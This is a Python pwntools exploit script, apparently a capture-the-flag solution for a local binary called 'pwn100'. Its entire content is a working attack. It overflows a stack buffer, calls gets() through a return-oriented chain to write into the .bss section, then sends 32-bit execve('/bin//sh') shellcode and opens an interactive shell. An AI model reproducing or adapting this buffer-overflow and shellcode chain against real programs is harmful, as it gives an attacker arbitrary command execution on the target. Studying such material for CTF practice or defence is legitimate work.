from pwn import *

p = process("./pwn100")
raw_input()

gets_plt = p32(0x080482F0)
bss = p32(0x0804A030)
popret = p32(0x80482d1)

payload = "a"*(0x18+4)
payload+= gets_plt
payload+= popret
payload+= bss
payload+= bss

p.sendline(payload)

payload = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
p.sendline(payload)

p.interactive()
